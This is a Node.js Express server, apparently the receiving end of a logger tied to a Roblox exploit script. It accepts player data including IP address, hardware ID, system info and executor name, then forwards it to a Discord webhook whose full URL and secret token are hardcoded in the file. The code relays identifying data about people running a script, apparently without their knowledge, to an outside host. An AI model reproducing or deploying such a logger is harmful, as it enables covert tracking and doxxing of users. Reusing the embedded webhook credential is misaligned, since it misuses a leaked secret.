const express = require("express");
const axios = require("axios");
const app = express();

app.use(express.json());
app.use(require("cors")()); 

app.post("/webhook", async (req, res) => {
    try {
        
        const { 
            userId,
            playerName,
            placeId,
            placeName,
            executorName,
            systemInfo,
            ipAddress,
            deviceType,
            hardwareId
        } = req.body;

        
        const thumbnailUrl = `https://thumbnails.roblox.com/v1/users/avatar?userIds=${userId}&size=150x150&format=Png&isCircular=false`;
        const thumbnailResponse = await axios.get(thumbnailUrl);
        const avatarUrl = thumbnailResponse.data.data[0].imageUrl;

        
        const embed = {
            title: "**Executed!!**",
            type: "rich",
            thumbnail: { url: avatarUrl },
            description: `Player: ||**${playerName}**||`,
            color: 0x800000,
            fields: [
                { name: "Username", value: playerName, inline: true },
                { name: "Game ID", value: placeId, inline: true },
                { name: "User ID", value: userId, inline: true },
                { name: "Place Name", value: placeName, inline: true },
                { name: "==============Info===============", value: "", inline: false },
                { name: "Executor", value: executorName, inline: true },
                { name: "System Info", value: systemInfo, inline: true },
                { name: "IP Address", value: ipAddress, inline: true },
                { name: "Device", value: deviceType, inline: true },
                { name: "Hardware ID", value: hardwareId, inline: false }
            ]
        };

      
        await axios.post("https://discord.com/api/webhooks/1348054742470758492/oSKgV7EdDOphm3NkHW2efBP7xLPYlkT4IferB1AfjFcCmn7MGUojGaAMrgbF7mHgQ8MW", {
            embeds: [embed]
        });

        res.status(200).send("Success!");
    } catch (error) {
        console.error("Erro:", error);
        res.status(500).send("Error: " + error.message);
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Servidor rodando na porta ${PORT}`));
